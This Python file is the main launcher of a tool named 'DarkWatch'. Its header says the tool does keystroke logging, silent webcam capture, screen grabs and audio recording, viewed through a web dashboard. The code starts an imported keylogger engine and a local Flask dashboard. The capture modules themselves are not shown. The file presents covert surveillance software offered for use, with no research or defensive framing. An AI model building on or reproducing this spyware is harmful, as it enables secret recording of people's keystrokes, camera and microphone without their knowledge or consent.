"""
===================================================================
Program: DarkWatch - Intelligence & Telemetry Suite
Author: DarkWatch Core
Date: 2026
Description: Main entry point for DarkWatch Engine with
             Active Window Keystroke Logging, Silent WebCamera,
             Screen Grabs, Audio Capture, and Glassmorphism Web Dashboard.
===================================================================
"""

import os
import sys
import time
import json
import threading

from logger_engine import KeyLoggerEngine
from dashboard import WebDashboard


def load_dotenv_file(filepath=".env"):
    """Load key-value pairs from .env into os.environ if present."""
    if os.path.exists(filepath):
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#") and "=" in line:
                        k, v = line.split("=", 1)
                        k = k.strip()
                        v = v.strip().strip("'\"")
                        if k and k not in os.environ:
                            os.environ[k] = v
        except Exception:
            pass


def main():
    load_dotenv_file()
    print("=" * 60)
    print("       DARKWATCH - INTELLIGENCE & TELEMETRY SUITE")
    print("=" * 60)

    config_path = "config.json"
    if not os.path.exists(config_path):
        print(f"[!] Warning: {config_path} not found. Creating default configuration.")

    # Initialize Engine
    engine = KeyLoggerEngine(config_path=config_path)
    engine.start()

    # Initialize Web Dashboard
    dashboard_cfg = engine.config.get("dashboard", {})
    host = dashboard_cfg.get("host", "127.0.0.1")
    port = dashboard_cfg.get("port", 5000)

    if dashboard_cfg.get("enabled", True):
        dashboard = WebDashboard(engine=engine, config_path=config_path)
        
        # Start Flask dashboard server
        print(f"\n[+] Web Dashboard live at: http://{host}:{port}")
        print("[+] Press Ctrl+C to stop the suite cleanly.\n")
        try:
            dashboard.run(host=host, port=port)
        except KeyboardInterrupt:
            print("\n[*] Stopping KeyLogger Engine...")
            engine.stop()
            sys.exit(0)
    else:
        print("[*] Web Dashboard is disabled in config. Running engine in CLI mode...")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            engine.stop()
            sys.exit(0)


if __name__ == "__main__":
    main()
